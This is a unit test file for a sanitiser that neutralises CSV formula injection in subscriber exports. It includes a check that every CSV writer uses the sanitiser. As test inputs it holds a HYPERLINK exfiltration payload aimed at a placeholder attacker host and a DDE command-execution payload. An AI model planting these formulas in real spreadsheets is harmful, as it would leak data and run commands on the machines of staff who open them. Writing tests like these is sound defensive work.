import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvSafe, isFormulaInjection } from '../app/components/csv-safe.ts';

/**
 * CSV FORMULA INJECTION.
 *
 * An operator exports subscribers and opens the file in Excel. Every string
 * in that file came from somewhere — a signup form, a ticket, a device note —
 * and Excel evaluates any cell starting `=`, `+`, `-`, `@`. The victim is the
 * ISP's own staff, on their own machine, opening a file they have every
 * reason to trust.
 *
 * Run with:  npm run test:unit   (node's built-in runner — no new dependency)
 */

// ── the payloads that made this a finding ──────────────────────────────────
test('the classic four leads are neutralised', () => {
  for (const payload of ['=1+1', '+1+1', '-1+1', '@SUM(A1:A2)']) {
    const out = csvSafe(payload) as string;
    assert.equal(out, `'${payload}`, `${payload} was not neutralised`);
    assert.ok(!/^[=+\-@]/.test(out), 'still opens with a formula character');
  }
});

test('the exfiltration payload from the audit', () => {
  const attack = '=HYPERLINK("http://attacker/"&A1,"Click for invoice")';
  assert.equal(csvSafe(attack), `'${attack}`);
});

test('DDE command execution is neutralised too', () => {
  assert.equal(csvSafe('=cmd|\'/c calc\'!A0'), `'=cmd|'/c calc'!A0`);
});

test('leading tab and carriage return count — Excel treats them as leads', () => {
  assert.equal(csvSafe('\t=1+1'), `'\t=1+1`);
  assert.equal(csvSafe('\r=1+1'), `'\r=1+1`);
});

// ── and normal exports must not break ──────────────────────────────────────
test('ordinary values pass through byte for byte', () => {
  for (const ok of [
    'Muhammad Ihtisham',
    'ihtisham@jointbox.net',
    '10Mbps Home',
    '192.168.88.20',
    'DHA Phase 5, Lahore',
    'PPPoE / active',
    '',
  ]) {
    assert.equal(csvSafe(ok), ok, `mangled a legitimate value: ${ok}`);
  }
});

test('numbers stay numbers, including negative ones', () => {
  // THIS IS WHY THE FIX PREFIXES RATHER THAN STRIPS. A numeric -500 is a
  // value, not a payload; quoting it would break every sum in the sheet, and
  // stripping the sign would turn a refund into a charge.
  assert.equal(csvSafe(-500), -500);
  assert.equal(csvSafe(0), 0);
  assert.equal(csvSafe(1234.56), 1234.56);
});

test('a STRING that starts with a minus is still prefixed', () => {
  // It has to be. `-2+3` is a formula to Excel whether or not a human meant
  // it as one. The prefix is visible but lossless; evaluation is not.
  assert.equal(csvSafe('-2Mbps Burst'), `'-2Mbps Burst`);
});

test('null and undefined are left alone for the caller to render', () => {
  assert.equal(csvSafe(null), null);
  assert.equal(csvSafe(undefined), undefined);
});

// ── the detector, used by the ratchet below ────────────────────────────────
test('isFormulaInjection identifies exactly the dangerous leads', () => {
  assert.ok(isFormulaInjection('=1'));
  assert.ok(isFormulaInjection('@x'));
  assert.ok(!isFormulaInjection('Ali'));
  assert.ok(!isFormulaInjection(500));
  assert.ok(!isFormulaInjection(null));
});

// ── THE RATCHET ────────────────────────────────────────────────────────────
/**
 * Both writers must route through csvSafe. A third export helper added later
 * would reintroduce the hole without touching either file above, and nothing
 * else in the build would notice.
 */
test('every CSV writer sanitises', async () => {
  const fs = await import('node:fs');
  const url = await import('node:url');
  const path = await import('node:path');
  const here = path.dirname(url.fileURLToPath(import.meta.url));
  const dir = path.join(here, '..', 'app', 'components');

  const writers = fs
    .readdirSync(dir)
    .filter((f) => /\.tsx?$/.test(f))
    .filter((f) => {
      const src = fs.readFileSync(path.join(dir, f), 'utf8');
      return /text\/csv/.test(src);
    });

  assert.ok(writers.length >= 2, `expected to find the CSV writers, found ${writers.length}`);
  for (const w of writers) {
    const src = fs.readFileSync(path.join(dir, w), 'utf8');
    assert.match(src, /csvSafe/, `${w} writes CSV without calling csvSafe`);
  }
});
